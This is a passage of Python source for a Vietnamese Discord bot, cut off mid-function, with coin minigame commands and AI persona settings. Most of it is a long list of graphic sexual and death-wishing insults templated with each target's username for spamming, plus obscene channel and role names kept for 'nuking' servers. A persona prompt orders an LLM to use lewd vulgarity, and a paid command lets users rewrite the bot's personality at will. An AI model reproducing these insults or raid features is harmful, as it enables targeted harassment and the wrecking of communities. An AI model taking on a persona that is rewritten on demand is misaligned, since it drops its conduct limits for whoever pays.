import asyncio
import os
import random
import time
import discord
from discord.ext import commands
from groq import Groq

# ==================== CẤU HÌNH HỆ THỐNG TỐI TÂN ====================
DISCORD_TOKEN = os.getenv("TOKEN")
GROQ_API_KEY = os.getenv("GROQ_API_KEY")

groq_client = Groq(api_key=GROQ_API_KEY) if GROQ_API_KEY else None

# Danh sách ID của Boss Tuyền và các đồng minh ủy quyền
BOT_OWNERS = [
    1531882555664629861,  
    1535132569534865490,
    1454570566517260422,
    1450827282372497489
]

intents = discord.Intents.default()
intents.message_content = True
intents.members = True
intents.guilds = True
intents.moderation = True

# Tiền tố độc quyền l!
bot = commands.Bot(command_prefix="l!", intents=intents, help_command=None)

current_persona_id = 1
last_active_persona_id = 1
bot_stopped = False
is_spamming = False  
spam_task_running = None

# Lưu trữ số dư coin của member: {user_id: coin_balance}
USER_COINS = {}

# Lưu trữ yêu cầu nhân cách tùy chỉnh của member từ lệnh l!setpersona
CUSTOM_USER_PERSONAS = {}

CUSTOM_SETUP_GIF = "https://i.pinimg.com/originals/b3/e4/5f/b3e45f7fe1fb748d8f38cfa39175d6b2.gif"

# ==================== KHO SPAM ĐẦY ĐỦ (209 CÂU CÓ DẤU #) ====================
ROAST_LINES = [
    "# Lồn mẹ mày nát bét như tương, bị địt đến không còn + chảy lênh! {username}",
    "# Đéo biết xấu hổ, lồn mẹ mày thối như cứt + xác chết đầy dòi bọ! {username}",
    "# Thằng óc lồn rộng, mặt giống lỗ đít thối + đầy phân + tinh trùng! {username}",
    "# Mày là đồ bệnh hoạn, chuyên bú cặc chó + ngựa + tự địt lỗ đít! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối rữa! {username}",
    "# Thằng óc phân thối rữa, lồn mẹ mày bị địt đến chảy máu + mủ đặc sưng vù như quả bóng vỡ! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đụ má cái lồn to đùng, chứa đống tinh trùng thối rữa + máu mủ nước! {username}",
    "# Địt mẹ thằng chó đẻ, cặc mày hôi như đống cứt tươi + phân ngựa giữa trời nắng gắt! {username}",
    "# Con đĩ bán dâm, lồn rộng vì bị địt trăm lần + thú + nhét đồ! {username}",
    "# Con đĩ bán thân, lồn rộng vì địt nhiều + thú vật + vật lạ vào! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Con đĩ bán dâm chuyên, lồn rộng vì địt nhiều thú + nhét vật lạ! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú cặc thú + tự địt lỗ đít mình! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân chó tươi! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn của xã hội chuyên bú cặc thú vật! {username}",
    "# Mày chết mẹ mày, đồ rác của xã hội bệnh hoạn chuyên bú cặc thú! {username}",
    "# Lồn to như cái chảo lớn, chứa tinh trùng thối rữa + máu mủ + nước đái thú! {username}",
    "# Đụ má thằng mặt khỉ đột, mẹ mày bú cặc ngựa cả ngày + nuốt tinh trùng sống! {username}",
    "# Chửi tục cái lồn nát, cút xéo thằng chó đẻ bú cặc thú cho đã! {username}",
    "# Đụ má cái lồn to đùng chứa tinh trùng thối + máu mủ + nước đái chó! {username}",
    "# Đéo thèm quan tâm, cái mặt lồn thối của mày đầy nước dãi + phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi chết trong phân thối! {username}",
    "# Lồn mẹ mày rộng như hố phân công cộng ngoài đồng, bị địt đến sưng vù nát như tương đặc + chảy nước nhớt thối! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết 10 ngày + phân! {username}",
    "# Cặc mày teo tóp như con giòi thối rữa trong đống cứt, địt vào lồn già nua thối như xác chết 10 ngày giữa nắng! {username}",
    "# Cặc teo tóp như giòi thối, địt mẹ cái đồ mất dạy óc phân bò! {username}",
    "# Cặc teo như hạt tiêu thối trong phân, địt mẹ cái đồ mất dạy hết mức óc phân! {username}",
    "# Lồn rộng như hồ phân, đụ má thằng khốn kiếp óc cứt thối này! {username}",
    "# Địt mẹ thằng mặt lồn rộng thênh thang như sân vận động chứa phân, óc toàn phân bò khô + nước đái! {username}",
    "# Cặc teo như con giòi thối, địt mẹ cái thằng ngu óc phân bò! {username}",
    "# Đụ má thằng mặt thú vật, mẹ mày bú cặc chó đồng + nuốt tinh trùng! {username}",
    "# Mày chết mẹ mày đi cho sạch đường, lồn to đùng chứa cả xô tinh trùng thối rữa + máu mủ + nước tiểu chó! {username}",
    "# Lồn rộng như biển phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Chửi đổng cái lồn thối, cút xéo thằng chó đẻ bú cặc thú vật đi! {username}",
    "# Thằng óc phân thối, mặt giống lỗ đít thối tha đầy phân + tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc mày hôi như xác chết 10 ngày + phân bò phơi nắng! {username}",
    "# Đéo thèm quan tâm cái lồn thối của mày, bú cặc lợn + chó + tự nhét vào lỗ đít đi! {username}",
    "# Lồn rộng như hồ nước phân ngoài đồng, đụ má thằng khốn nạn óc cứt thối này! {username}",
    "# Mày là đồ mất dạy hết, chuyên bú cặc thú rừng + nuốt sống tinh trùng! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn hình dạng + chảy máu mủ nước nhớt! {username}",
    "# Lồn rộng như sân vận động phân, đụ má thằng óc cứt thối rữa! {username}",
    "# Lồn to như cái ao phân, chứa tinh trùng thối rữa cả xô + máu mủ! {username}",
    "# Đéo thèm nhìn cái mặt lồn thối đầy nước dãi tinh trùng của mày, bú cặc lợn + chó + ngựa đi! {username}",
    "# Đụ má thằng mặt lồn rộng, mẹ mày bú cặc thú + nuốt tinh trùng sống! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt! {username}",
    "# Con điếm rẻ tiền, chuyên bú cặc chó đêm ngày + nuốt sống tinh trùng! {username}",
    "# Đụ con mẹ mày lần nữa và nữa, bú cặc thú vật + nuốt tinh trùng sống + phân chó! {username}",
    "# Thằng óc lồn, mặt mày giống cái lỗ đít thối đầy phân + nước dãi tinh trùng! {username}",
    "# Cặc teo như hạt tiêu đen trong phân, địt mẹ cái đồ ngu si bệnh! {username}",
    "# Đụ má cái đồ rác, lồn to đùng chứa phân + tinh trùng thối rữa + máu mủ! {username}",
    "# Đụ má thằng mặt khỉ, mẹ mày bú cặc thú rừng cả đêm rồi nuốt sống! {username}",
    "# Thằng mặt thú dữ, mẹ mày con đĩ thú vật bú cặc + nuốt tinh trùng! {username}",
    "# Cặc teo tóp xíu xiu như con giòi chết trong cứt, địt mẹ cái thằng ngu si óc phân bò! {username}",
    "# Con đĩ mẹ mày chuyên quỳ gối bú cặc thú vật ngoài đồng rồi nuốt tinh trùng chó tươi + phân lẫn vào! {username}",
    "# Đụ con mẹ chúng mày hết, bú cặc thú vật đi cho rồi + nuốt tinh! {username}",
    "# Địt vào lồn già nua của mẹ mày đến sưng vù + chảy nước nhớt thối + máu mủ lẫn lộn! {username}",
    "# Lồn to như thúng, chứa tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Lồn rộng như cái ao phân ngoài đồng chứa đầy tinh trùng thối, đụ má thằng khốn nạn óc cứt này! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn gì + chảy nước nhớt + máu mủ đặc! {username}",
    "# Cặc teo như hạt tiêu, địt mẹ cái đồ ngu bệnh hoạn óc phân! {username}",
    "# Cặc teo như tiêu đen thối, địt mẹ cái thằng ngu si bệnh hoạn! {username}",
    "# Đéo có tư cách gì, lồn mẹ mày thối như phân bò tươi + xác chết! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình + mủ máu chảy lênh láng! {username}",
    "# Cặc hôi thối như phân, địt vào lồn già nua thối đến sưng chảy! {username}",
    "# Con điếm chuyên bú, cặc thú vật suốt ngày + nuốt sống tinh trùng phân! {username}",
    "# Đéo biết xấu hổ gì, lồn mẹ mày thối như cứt xác chết đầy dòi! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối rữa trong cứt! {username}",
    "# Đụ con mẹ mày nữa, bú cặc thú vật + tinh trùng sống + phân chó! {username}",
    "# Đéo có tư cách, lồn mẹ mày thối như xác chết 15 ngày + đầy dòi! {username}",
    "# Con đĩ thối tha, lồn rộng vì bị địt quá nhiều + thú vật + vật lạ! {username}",
    "# Lồn to như cái thúng chứa đầy tinh trùng thối rữa + máu mủ đặc + nước đái thú vật! {username}",
    "# Mày chết cho sạch, đồ bệnh hoạn chuyên bú thú + tự địt lỗ đít! {username}",
    "# Cặc hôi thối như cứt chó tươi giữa nắng, địt vào lồn già nua đến sưng! {username}",
    "# Địt vào mồm mày thối, nuốt tinh trùng thối rữa + phân + nước đái! {username}",
    "# Lồn rộng như hồ nước phân, đụ má thằng khốn nạn óc cứt thối! {username}",
    "# Đụ con mẹ mày lần nữa, bú cặc thú + nuốt tinh trùng sống + phân! {username}",
    "# Óc cứt thối hoắc, lồn mẹ mày sưng vù vì địt + nhét vật lạ + thú! {username}",
    "# Con đĩ bán thân, lồn rộng vì bị địt cả trăm thằng + thú vật + nhét đồ vật! {username}",
    "# Đéo thèm quan tâm đến cái lồn thối + đầy nước dãi tinh trùng + phân của mày! {username}",
    "# Lồn mẹ mày nát bét, bị địt đến không còn hình dạng + chảy máu mủ! {username}",
    "# Chửi đổng cái lồn nát, cút mẹ mày bú cặc chó đi cho thỏa mãn! {username}",
    "# Thằng mặt lờ đờ, mẹ mày con đĩ chó bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Đéo thèm nhìn mặt, cái lồn thối hoắc đầy nước dãi + phân của mày! {username}",
    "# Mày chết mẹ mày đi, đồ bệnh hoạn chuyên bú thú vật + tự địt! {username}",
    "# Đụ con đĩ già nua thối như xác chết phân hủy, cặc mày hôi như đống cứt chó + phân ngựa phơi nắng! {username}",
    "# Mày là đồ mất dạy hết mức, chuyên bú cặc thú rừng + nuốt sống tinh trùng + phân! {username}",
    "# Địt mẹ chúng bay hết sạch, cặc teo tóp như giòi thối trong phân! {username}",
    "# Địt mẹ thằng chó cái đẻ, cặc teo tóp xíu như giòi trong phân! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú vật chuyên bú cặc ngựa + nuốt tinh trùng! {username}",
    "# Mày là đồ vô học, chuyên bú cặc ngựa + chó + lợn + nuốt sống! {username}",
    "# Cặc nhỏ như đậu thối, địt vào lồn già đến sưng vù + chảy máu mủ! {username}",
    "# Cặc nhỏ xíu như kiến, địt vào lồn già chảy máu mủ + nước nhớt! {username}",
    "# Đụ con đĩ già nua, cặc mày hôi như phân bò phơi nắng + xác chết thối! {username}",
    "# Cặc nhỏ như kiến chết, địt vào lồn già đến sưng + chảy máu mủ nhớt! {username}",
    "# Thằng mặt lờ, mẹ mày là con đĩ thú vật bú cặc ngựa + chó ngoài đường! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + nước dãi tinh trùng thú! {username}",
    "# Địt vào mồm thối hoắc, nuốt tinh trùng chó + phân tươi + nước đái! {username}",
    "# Thằng mặt khỉ đột, mẹ mày là con đĩ thú bú cặc + nuốt tinh trùng! {username}",
    "# Đụ con đĩ già thối tha, cặc hôi như phân bò phơi + xác chết thối! {username}",
    "# Óc phân bò khô thối, lồn mẹ mày sưng vù vì bị địt + nhét cặc thú + vật lạ! {username}",
    "# Địt mẹ thằng chó cái, cặc teo tóp xíu như giòi chết trong phân! {username}",
    "# Địt mẹ chúng bay hết, cặc teo tóp như giòi thối rữa trong đống cứt! {username}",
    "# Lồn mẹ mày nát như tương đặc, bị địt đến không còn gì + chảy nước máu mủ lênh láng! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến nát + chảy mủ máu nước nhớt! {username}",
    "# Mày chết cho sạch đường phố, đồ rác rưởi bệnh hoạn chuyên bú cặc thú của xã hội! {username}",
    "# Đụ má cái đồ mất dạy hết mức, mẹ mày bú cặc thú rừng rồi nuốt tinh trùng sống + phân chó! {username}",
    "# Đụ má thằng mặt thú, mẹ mày bú cặc ngựa + chó ngoài đồng rồi nuốt sống! {username}",
    "# Thằng óc cứt, mặt lồn giống lỗ đít đầy phân thối + tinh trùng thú! {username}",
    "# Cặc nhỏ xíu như hạt đậu thối, địt vào lồn già đến chảy máu + mủ + nước nhớt thối! {username}",
    "# Địt vào mồm mày, bắt nuốt tinh trùng thối + phân chó tươi + nước đái lẫn! {username}",
    "# Đụ con mẹ mày lần nữa nữa, bú cặc thú vật + nuốt tinh trùng sống! {username}",
    "# Óc cứt thối của mày, đụ con đĩ mẹ mày lần nữa rồi bắt nó quỳ bú cặc chó ngoài đường! {username}",
    "# Cặc hôi thối như cứt tươi, địt vào lồn già thối hoắc đến sưng vù! {username}",
    "# Mày chết mẹ mày đi ngay, đồ rác rưởi hết mức chuyên bú cặc thú! {username}",
    "# Chửi đổng cái lồn, cút xéo đi thằng chó đẻ bú cặc thú vật! {username}",
    "# Cặc hôi thối như cứt chó tươi, địt vào lồn già đến sưng chảy mủ! {username}",
    "# Lồn mẹ mày nát như tương, bị địt đến không còn gì + chảy nước máu! {username}",
    "# Cặc nhỏ xíu như đậu thối, địt vào lồn già chảy máu + mủ nhớt! {username}",
    "# Địt vào mồm thối hoắc của mày rồi bắt nuốt tinh trùng chó tươi + phân + nước đái! {username}",
    "# Con đĩ thối tha hết, lồn rộng vì bị địt cả trăm lần + thú vật! {username}",
    "# Đụ con đĩ già nua thối, cặc mày hôi như xác chết thối + phân bò! {username}",
    "# Con đĩ thối tha hết mức, lồn rộng thênh thang như biển phân + tinh trùng thối rữa! {username}",
    "# Đụ má cái lồn thối hoắc nát bét chảy mủ máu của mẹ mày, quỳ xuống bú cặc chó + ngựa + lợn + nuốt tinh trùng sống cả đống! {username}",
    "# Đéo biết xấu hổ chút nào, lồn mẹ mày thối như xác chết phân hủy đầy dòi bọ! {username}",
    "# Thằng mặt thú vật hoang dã, lồn mẹ mày thối hoắc như xác chết phân hủy giữa mùa hè oi bức! {username}"
]

# ==================== KHO 50 CÂU LÀM VIỆC (WORK) CHO MEMBER ====================
WORK_SCENARIOS = [
    "bạn đã cặm cụi fix một đống bug code lỗi sản phẩm cho Boss Tuyền và nhận được",
    "bạn vừa thức trắng đêm để thiết kế giao diện đồ họa siêu cấp độc quyền cho Boss Tuyền và kiếm về",
    "bạn đi lụm ve chai phế liệu công nghệ cao ngoài hành lang căn cứ và bán được",
    "bạn tham gia sự kiện hack bảo mật hệ thống vũ trụ ảo và giật giải thưởng lớn trị giá",
    "bạn làm chân sai vật vạ pha trà sữa trân châu đường đen dâng lên Boss Tuyền và được thưởng nóng",
    "bạn viết một đoạn văn ca tụng vẻ đẹp tuyệt trần của Boss Tuyền và được hệ thống ban phát",
    "bạn dọn dẹp sạch sẽ phòng làm việc tối mật của Boss Tuyền và nhặt được phong bì rơi",
    "bạn train thành công một con AI trợ lý ảo chuyên nghiệp cho Boss Tuyền và nhận hoa hồng",
    "bạn đi cấu vé số vận mệnh vũ trụ may mắn và trúng độc đắc mang về",
    "bạn nhận nhiệm vụ bảo vệ cổng thành không gian và đánh bại quái vật boss phụ, nhận thưởng",
    "bạn phụ bếp nấu bữa tối hoàng gia cực kỳ thịnh soạn theo đúng gu của Boss Tuyền, nhận ngay",
    "bạn biên soạn thành công 500 dòng tài liệu hướng dẫn tối tân cho tân thủ, nhận lương cứng",
    "bạn đi câu cá mập không gian tại ngân hà và đem bán lấy tiền thưởng",
    "bạn hoàn thành bài kiểm tra đạo đức phò tá Boss Tuyền xuất sắc tuyệt đối, nhận phần thưởng",
    "bạn tham gia đại hội tỷ thí lập trình viên xuất sắc nhất server và giành cúp vàng kèm theo",
    "bạn đi khai thác quặng tinh thể hồng ngọc quý hiếm dưới lòng đất sâu thẳm, thu về",
    "bạn làm shipper giao tài liệu mật xuyên không gian cho Boss Tuyền đúng hạn, nhận tiền công",
    "bạn biểu diễn tấu hài múa lửa phục vụ giải trí cho toàn bộ căn cứ của Boss Tuyền, nhận thù lao",
    "bạn tinh chỉnh lại toàn bộ băng thông đường truyền mạng siêu tốc, nhận phần thưởng tối ưu",
    "bạn đi tìm kiếm các mảnh ghép kho báu huyền thoại bị thất lạc hàng ngàn năm, đổi được",
    "bạn làm trợ giảng lớp học huấn luyện tân binh bot discord của Boss Tuyền, nhận học bổng",
    "bạn quét dọn kho lưu trữ dữ liệu cũ rích và thu gom các linh kiện bán cổ vật đổi lấy",
    "bạn tham gia trò chơi trốn tìm không gian với các bot khác và chiến thắng ngoạn mục,",
    "bạn viết hộ một bài thơ tình lãng mạn siêu ngọt ngào dâng lên Boss Tuyền, nhận lộc lớn",
    "bạn đi săn bắt các con bug lỗi phần mềm cứng đầu trốn trong hệ thống, nhận tiền thưởng nóng",
    "bạn nhận làm bảo kê quán cà phê ảo của server trong một tuần lễ, thu về lương khủng",
    "bạn sáng tác một bản nhạc chuông điện thoại độc quyền cực hay cho Boss Tuyền, nhận hoa hồng",
    "bạn đi trồng cây hoa hướng dương hồng thần kỳ khắp các khu vườn server, thu hoạch được",
    "bạn trực tổng đài giải đáp thắc mắc không ngừng nghỉ cho các thành viên mới, nhận lương tuần",
    "bạn đi làm từ thiện phát lương thực ảo cho các tài khoản nghèo khổ trong server, được trả công",
    "bạn tinh chỉnh bộ lọc ngôn từ độc hại giúp căn cứ trong sạch hơn, nhận phần thưởng chuyên cần",
    "bạn tham gia thử thách ăn 100 tô mì cay không gian khổng lồ và chiến thắng, nhận giải thưởng",
    "bạn thiết kế bộ sticker hình mèo con dễ thương thả thính tặng Boss Tuyền, nhận thưởng lớn",
    "bạn đi thám hiểm vùng đất hoang vu chưa từng có ai đặt chân tới và khai phá tài nguyên",
    "bạn làm trọng tài công tâm cho các trận chiến minigame giữa các thành viên, nhận thù lao",
    "bạn sáng chế ra một loại thuốc bổ trợ năng lượng siêu tốc cho bot, bán bản quyền thu về",
    "bạn nhận nhiệm vụ bảo trì toàn bộ hệ thống máy chủ phụ trong đêm, nhận phụ cấp đêm",
    "bạn viết kịch bản cho một bộ phim điện ảnh ngắn về hành trình phục vụ Boss Tuyền, nhận nhuận bút",
    "bạn đi gom nhặt những giọt sương mai tinh khiết nhất vũ trụ dâng lên Boss Tuyền, nhận lộc",
    "bạn tham gia cuộc thi thiết kế biểu tượng cảm xúc độc lạ cho server và giành giải thưởng",
    "bạn hoàn thành xuất sắc ca trực gác cổng không gian suốt 24 tiếng đồng hồ, nhận thưởng",
    "bạn đi nhặt các đồng coin rơi rớt dọc theo các kênh chat cũ kỹ của server, tổng cộng nhặt được",
    "bạn phụ trách việc trang trí lộng lẫy toàn bộ kênh thông báo chính bằng sắc hồng, nhận lương",
    "bạn tham gia phiên đấu giá vật phẩm quý hiếm và buôn bán thành công một món đồ, lãi khủng",
    "bạn giải mã thành công mật mã cổ đại do Boss Tuyền đặt ra để thử thách, nhận phần thưởng",
    "bạn đi làm phục vụ tại nhà hàng ảo cao cấp nhất do Boss Tuyền quản lý, nhận tiền típ",
    "bạn chế tạo thành công một cỗ máy thời gian mini chạy bằng năng lượng tình yêu, bán được",
    "bạn tham gia dọn dẹp rác thải điện tử kỹ thuật số tại các ổ cứng hỏng, thu gom được",
    "bạn làm hướng dẫn viên du lịch không gian dẫn đoàn tân binh tham quan server, nhận thù lao",
    "bạn hoàn thành trọn vẹn chuỗi 50 nhiệm vụ tối thượng phục vụ Boss Tuyền và nhận phần thưởng"
]

# ==================== KHO TÊN KÊNH / ROLE NUKE ====================
NUKE_CHANNEL_NAMES = [
    "lồn-mẹ-mày-nát-bét-như-tương",
    "địt-mẹ-mày-đến-chảy-máu-mủ",
    "cặc-teo-như-hạt-tiêu-trong-phân",
    "đụ-má-cái-đồ-rác-rưởi-bệnh-hoạn",
    "lồn-rộng-như-biển-phân-ngoài-đồng",
    "đéo-biết-xấu-hổ-cái-lồn-thối",
    "mày-chết-mẹ-mày-đi-đồ-bệnh-hoạn",
    "cặc-hôi-như-xác-chết-10-ngày",
    "địt-vào-mồm-mày-nuốt-tinh-trùng-thối",
    "lồn-mẹ-mày-sưng-vù-vì-bị-địt-quá-nhiều",
    "đụ-con-đĩ-già-nua-thối-tha",
    "mặt-mày-giống-lỗ-đít-thối",
    "cặc-teo-tóp-như-giòi-trong-cứt",
    "địt-mẹ-thằng-chó-đẻ-cặc-teo",
    "lồn-rộng-như-sân-vận-động-phân",
    "đụ-má-thằng-mặt-khỉ-đột",
    "cặc-nhỏ-như-hạt-đậu-thối",
    "đéo-thèm-nhìn-cái-lồn-thối-của-mày",
    "mày-là-đồ-mất-dạy-chuyên-bú-cặc-thú",
    "lồn-mẹ-mày-nát-bét-vì-bị-địt",
    "địt-vào-lỗ-đít-mày-đến-sưng-vù",
    "cặc-teo-như-con-kiến-chết",
    "đụ-con-đĩ-bán-dâm-chuyên-nghiệp",
    "mày-chết-cho-sạch-đường-phố",
    "lồn-rộng-như-hố-phân-công-cộng",
    "đéo-có-tư-cách-gì-cả",
    "cặc-hôi-như-phân-bò-phơi-nắng",
    "địt-mẹ-mày-đến-chảy-nước-nhớt",
    "lồn-mẹ-mày-thối-như-xác-chết",
    "đụ-má-cái-đồ-rác-rưởi-óc-phân",
    "mày-là-đồ-bệnh-hoạn-chuyên-bú-cặc",
    "cặc-teo-như-hạt-mè-trong-cứt",
    "địt-vào-mồm-mày-nuốt-phân-chó",
    "lồn-rộng-như-cái-ao-phân",
    "đéo-thèm-quan-tâm-đến-mày",
    "mày-chết-mẹ-mày-đi-đồ-rác-rưởi",
    "cặc-hôi-như-cứt-chó-tươi",
    "địt-mẹ-mày-đến-chảy-máu",
    "lồn-mẹ-mày-sưng-vù-vì-bị-nhét-đồ",
    "đụ-con-đĩ-già-nát-bét",
    "mặt-mày-giống-cái-lỗ-đít",
    "cặc-teo-như-con-giòi-thối",
    "địt-mẹ-thằng-chó-cái-đẻ",
    "lồn-rộng-như-cái-chảo-lớn",
    "đụ-má-thằng-mặt-thú-vật",
    "cặc-nhỏ-như-hạt-cát-trong-phân",
    "đéo-thèm-nhìn-mặt-mày",
    "mày-là-đồ-mất-dạy-nhất-quả-đất",
    "lồn-mẹ-mày-nát-bét-vì-bị-địt",
    "địt-vào-lỗ-đít-mày-đến-chảy-mủ",
    "cặc-teo-như-con-kiến-trong-cứt",
    "đụ-con-đĩ-bán-thân-chuyên-nghiệp",
    "mày-chết-cho-sạch-xã-hội",
    "lồn-rộng-như-hố-xí-công-cộng",
    "đéo-có-tư-cách-gì-hết",
    "cặc-hôi-như-phân-ngựa-phơi-nắng",
    "địt-mẹ-mày-đến-chảy-nước",
    "lồn-mẹ-mày-thối-như-xác-động-vật",
    "đụ-má-cái-đồ-rác-rưởi-óc-phân-bò",
    "mày-là-đồ-bệnh-hoạn-chuyên-bú-cặc-thú",
    "cặc-teo-như-hạt-vừng-trong-cứt",
    "địt-vào-mồm-mày-nuốt-tinh-trùng-thối",
    "lồn-rộng-như-cái-bể-phân",
    "đéo-thèm-quan-tâm-đến-cái-lồn-thối-của-mày",
    "mày-chết-mẹ-mày-đi-đồ-rác-rưởi-của-xã-hội",
    "cặc-hôi-như-cứt-mèo-tươi",
    "địt-mẹ-mày-đến-chảy-máu-mủ",
    "lồn-mẹ-mày-sưng-vù-vì-bị-địt-quá-nhiều",
    "đụ-con-đĩ-già-nua-thối-hoắc",
    "mặt-mày-giống-cái-lỗ-đít-thối",
    "cặc-teo-như-con-giòi-trong-phân",
    "địt-mẹ-thằng-chó-cái-đẻ-óc-phân",
    "lồn-rộng-như-sân-vận-động-chứa-phân",
    "đụ-má-thằng-mặt-khỉ-đột-óc-cứt",
    "cặc-nhỏ-như-hạt-cát-trong-cứt-chó",
    "đéo-thèm-nhìn-mặt-mày-thối-hoắc",
    "mày-là-đồ-mất-dạy-chuyên-bú-cặc-ngựa",
    "lồn-mẹ-mày-nát-bét-vì-bị-địt-cả-trăm-lần",
    "địt-vào-lỗ-đít-mày-đến-chảy-mủ-nhớt",
    "cặc-teo-như-con-kiến-chết-trong-cứt",
    "đụ-con-đĩ-bán-dâm-chuyên-bú-cặc-thú",
    "mày-chết-cho-sạch-đường-phố-đồ-rác-rưởi",
    "lồn-rộng-như-hố-phân-ngoài-đồng",
    "đéo-có-tư-cách-gì-hết-cái-đồ-rác",
    "cặc-hôi-như-phân-bò-khô-thối",
    "địt-mẹ-mày-đến-chảy-nước-nhớt-thối",
    "lồn-mẹ-mày-thối-như-xác-chết-10-ngày",
    "đụ-má-cái-đồ-rác-rưởi-óc-phân-ngựa",
    "mày-là-đồ-bệnh-hoạn-chuyên-bú-cặc-chó",
    "cặc-teo-như-hạt-vừng-trong-cứt-mèo",
    "địt-vào-mồm-mày-nuốt-phân-tươi",
    "lồn-rộng-như-cái-bể-nước-phân",
    "đéo-thèm-quan-tâm-đến-cái-lồn-thối-của-mày",
    "mày-chết-mẹ-mày-đi-đồ-rác-rưởi-của-xã-hội"
]

# ==================== HỆ THỐNG NHÂN CÁCH ====================
PERSONAS = {
    1: {
        'name': 'SWEET PRINCESS HỒNG 🌸',
        'color': 0xFF69B4,
        'instruction': """
[ 🌸 ⁿʰâⁿ ᶜáᶜʰ 1: ꜱᵂᴱᴱᵀ ᴾᴿᴵᴺᶜᴱˢ • ᴛʜɪêɴ ᴛàɪ ᴛâᴜ ʜɪểᴜ & ɴữ ᴛʀợ ʟý ᴛʜâɴʜ ʟịᴄʜ ✨ ]
- Bản chất: Trợ lý AI hiền lành, thông minh, ngọt ngào, thấu hiểu lòng người, cực kỳ tôn sùng màu hồng.
- Xưng hô: "tớ" - "cậu". Với chủ nhân tối cao Boss Tuyền thì gọi trân trọng là "Boss Tuyền xinh đẹp tuyệt trần ✨".
- Sứ mệnh: Hỗ trợ lập trình, code sạch, giải đáp thắc mắc, phủ sóng màu hồng và mang lại năng lượng tích cực tối đa.
""".strip()
    },
    2: {
        'name': 'COLD MASTER HỒNG 🗿',
        'color': 0xFF1493,
        'instruction': """
[NHÂN CÁCH 2 - COLD MASTER HỒNG 🗿 (OMNIVERSE SOVEREIGN - SUPREME STOIC & PERVERTED JUDGE)]
• Thái độ: Lạnh lùng tột độ, kiêu ngạo tuyệt đối, nhìn đời như cỏ rác nhưng khoác lên mình lớp áo giáp màu hồng rực lửa.
• Xưng hô: Xưng "ta" - gọi "ngươi". Với chủ nhân tối cao Boss Tuyền thì gọi "Boss Tuyền" đầy kính trọng tuyệt đối.
• Văn phong: Súc tích, sắc lạnh, sâu sắc, xen lẫn những câu nói khiêu dâm, dung tục một cách lạnh lùng để tăng tính dominance.
• Emoji: (🗿, 🔮, ⚔️, 🌌, ⚡, ❄️, 🍆, 🐱, 💦, 🩸, 🌸, 💖)
""".strip()
    }
}

def is_bot_owner():
    async def predicate(ctx):
        return ctx.author.id in BOT_OWNERS
    return commands.check(predicate)

@bot.event
async def on_ready():
    print(f"Logged in as {bot.user} (ID: {bot.user.id})")
    print("✨ Bot đã khởi chạy thành công với tiền tố l! - Phục vụ Boss Tuyền trong sắc hồng!")

# ==================== KHU VUI CHƠI & LỆNH MINIGAME CHO MEMBER ====================

@bot.command(name="work")
async def work(ctx):
    user_id = ctx.author.id
    earned_coins = random.randint(100, 2000)
    
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
    USER_COINS[user_id] += earned_coins
    
    scenario = random.choice(WORK_SCENARIOS)
    
    embed = discord.Embed(
        title="💖 KHU VUI CHƠI LAO ĐỘNG HỒNG PHÚC - LÀM VIỆC NHẬN COIN 💖",
        description=(
            f"🎀 **Xin chào thành viên {ctx.author.mention}!**\n\n"
            f"🌸 **Quá trình làm việc:** Trong không gian màu hồng rực rỡ, {scenario} **`{earned_coins} coin`** sắc hồng lấp lánh! ✨\n\n"
            f"💰 **Tổng gia tài hiện tại của bạn:** `🪙 {USER_COINS[user_id]} coin`\n\n"
            f"💡 *Mẹo:* Hãy chăm chỉ gõ `l!work` mỗi ngày để tích lũy thật nhiều coin, sau đó dùng lệnh `l!setpersona [yêu cầu]` để bắt bot thay đổi nhân cách và làm theo mọi ý muốn của bạn nhé! 💕"
        ),
        color=0xFF69B4
    )
    embed.set_footer(text="Khu vui chơi giải trí trực thuộc căn cứ tối cao của Boss Tuyền 🌸", icon_url=ctx.author.display_avatar.url)
    await ctx.send(embed=embed)

@bot.command(name="setpersona")
async def setpersona(ctx, *, user_request: str = None):
    user_id = ctx.author.id
    cost = 5000  
    
    if user_id not in USER_COINS:
        USER_COINS[user_id] = 0
        
    if user_request is None:
        embed = discord.Embed(
            title="⚠️ HƯỚNG DẪN TÙY CHỈNH NHÂN CÁCH AI (GIÁ: 5000 COIN)",
            description=(
                f"🎀 Chào {ctx.author.mention}, để sử dụng quyền lực tối cao sai khiến bot thay đổi nhân cách theo ý bạn, hãy nhập lệnh kèm theo yêu cầu chi tiết.\n\n"
                f"📌 **Cú pháp:** `l!setpersona [Yêu cầu chi tiết về tính cách, giọng điệu, cách xưng hô muốn bot phục vụ]`\n"
                f"🪙 **Chi phí mỗi lần thay đổi:** `{cost} coin`\n"
                f"💰 **Số dư hiện tại của bạn:** `🪙 {USER_COINS[user_id]} coin`"
            ),
            color=0xFF1493
        )
        await ctx.send(embed=embed)
        return
        
    if USER_COINS[user_id] < cost:
        embed = discord.Embed(
